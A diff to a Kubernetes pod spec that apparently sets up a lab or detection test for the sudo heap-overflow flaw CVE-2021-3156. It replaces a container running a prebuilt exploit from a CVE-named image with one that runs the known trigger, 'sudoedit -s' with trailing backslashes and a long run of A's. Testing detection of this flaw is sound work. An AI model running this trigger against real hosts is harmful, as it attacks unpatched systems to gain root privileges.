@@ -6,7 +6,7 @@ spec:
   restartPolicy: Never
   containers:
   - name: sudo-potential-privilege-escalation
-    image: chenaotian/cve-2021-3156:latest
+    image: angelrita/base-ubuntu:latest
     #imagePullPolicy: Never
     command: ['sh']
-    args: ['-c', 'cd ~/exp; sudo -u test bash -c "./exp; whoami > whoami.txt"; sleep infinity']
+    args: ['-c', 'sudo -u test sudoedit -s \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \\; sleep infinity']
